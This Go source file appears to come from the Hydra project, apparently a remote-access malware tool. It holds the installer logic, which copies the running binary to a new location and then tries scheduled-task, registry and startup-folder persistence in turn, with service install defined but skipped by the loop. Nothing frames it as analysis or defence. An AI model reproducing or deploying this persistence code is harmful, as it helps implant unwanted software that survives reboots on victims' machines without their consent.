package install

import (
	"log"

	"github.com/Raffy27/Hydra/util"
)

func persist(ptype int) error {
	switch ptype {
	case 0:
		return TryServiceInstall()
	case 1:
		return TryTaskInstall()
	case 2:
		return TryRegistryInstall()
	case 3:
		return TryFolderInstall()
	}
	return nil
}

//Install attempts to deploy the binary to the system and establish persistence.
func Install() {
	err := CreateBase()
	util.Panicln(err, "Base creation failed")
	err = CopyExecutable()
	util.Panicln(err, "Binary relocation failed")

	for i := 1; i < 4; i++ {
		if err := persist(i); err == nil {
			log.Printf("Persistence method #%d worked\n", i)
			break
		} else {
			log.Println(err)
		}
	}

	log.Println("done")

}

//Uninstall attempts to undo all of the changes done to the system by Install.
func Uninstall() {
	UninstallService()
}
